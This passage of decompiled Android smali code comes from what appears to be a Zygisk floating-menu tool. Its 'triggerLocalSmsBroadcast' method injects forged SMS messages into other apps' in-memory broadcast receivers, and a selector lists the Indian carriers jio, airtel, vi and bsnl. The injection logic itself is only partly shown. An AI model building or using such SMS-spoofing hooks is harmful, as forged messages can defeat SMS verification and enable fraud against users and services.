    invoke-direct {v3, v6}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v6, Lcom/floatingmenu/FloatingMenu$3;

    invoke-direct {v6, v5, v4, p2}, Lcom/floatingmenu/FloatingMenu$3;-><init>(Landroid/content/BroadcastReceiver;Landroid/content/Context;Landroid/content/Intent;)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_e6
    const/4 v3, 0x1

    goto :goto_b7

    :cond_e8
    if-eqz v3, :cond_f0

    const-string p1, "Local SMS injected successfully!"

    :goto_ec
    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->showToast(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_115

    :cond_f0
    const-string p1, "No active receivers found in memory."

    goto :goto_ec

    :cond_f3
    :goto_f3
    const-string p1, "Failed to generate SMS PDU"

    invoke-static {p0, p1}, Lcom/floatingmenu/FloatingMenu;->showToast(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_f8
    .catchall {:try_start_0 .. :try_end_f8} :catchall_47

    return-void

    :goto_f9
    new-instance p2, Ljava/lang/StringBuilder;

    const-string v0, "Failed: "

    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p0, p2}, Lcom/floatingmenu/FloatingMenu;->showToast(Landroid/content/Context;Ljava/lang/String;)V

    const-string p0, "zygisk_floating_menu"

    const-string p2, "Exception in triggerLocalSmsBroadcast"

    invoke-static {p0, p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_115
    return-void
.end method

.method private static updateSelector(Landroid/widget/LinearLayout;Ljava/lang/String;)V
    .registers 9

    if-eqz p0, :cond_70

    if-nez p1, :cond_5

    goto :goto_70

    :cond_5
    const/4 v0, 0x4

    new-array v1, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "jio"

    aput-object v3, v1, v2

    const-string v3, "airtel"

    const/4 v4, 0x1

    aput-object v3, v1, v4

    const/4 v3, 0x2

    const-string v4, "vi"

    aput-object v4, v1, v3

    const/4 v3, 0x3

    const-string v4, "bsnl"

    aput-object v4, v1, v3

    new-instance v3, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v3}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const v4, -0xef467f

    invoke-virtual {v3, v4}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-virtual {p0}, Landroid/view/View;->getContext()Landroid/content/Context;

    move-result-object v4

    const/high16 v5, 0x40c00000    # 6.0f

    invoke-static {v4, v5}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v4

    int-to-float v4, v4

    invoke-virtual {v3, v4}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    new-instance v4, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v4}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const v6, -0xe0d6c9

    invoke-virtual {v4, v6}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-virtual {p0}, Landroid/view/View;->getContext()Landroid/content/Context;

    move-result-object v6

    invoke-static {v6, v5}, Lcom/floatingmenu/FloatingMenu;->dpToPx(Landroid/content/Context;F)I

    move-result v5

    int-to-float v5, v5

    invoke-virtual {v4, v5}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    :goto_4c
    invoke-virtual {p0}, Landroid/view/ViewGroup;->getChildCount()I

    move-result v5

    if-ge v2, v5, :cond_70

    if-ge v2, v0, :cond_70

    invoke-virtual {p0, v2}, Landroid/view/ViewGroup;->getChildAt(I)Landroid/view/View;

    move-result-object v5

    instance-of v6, v5, Landroid/widget/Button;

    if-eqz v6, :cond_6d

    check-cast v5, Landroid/widget/Button;

    aget-object v6, v1, v2

    invoke-virtual {v6, p1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_6a

    invoke-static {v5, v3}, Lcom/floatingmenu/a;->c(Landroid/widget/Button;Landroid/graphics/drawable/GradientDrawable;)V

    goto :goto_6d

    :cond_6a
    invoke-static {v5, v4}, Lcom/floatingmenu/a;->c(Landroid/widget/Button;Landroid/graphics/drawable/GradientDrawable;)V

    :cond_6d
    :goto_6d
    add-int/lit8 v2, v2, 0x1

    goto :goto_4c

    :cond_70
    :goto_70
    return-void
.end method
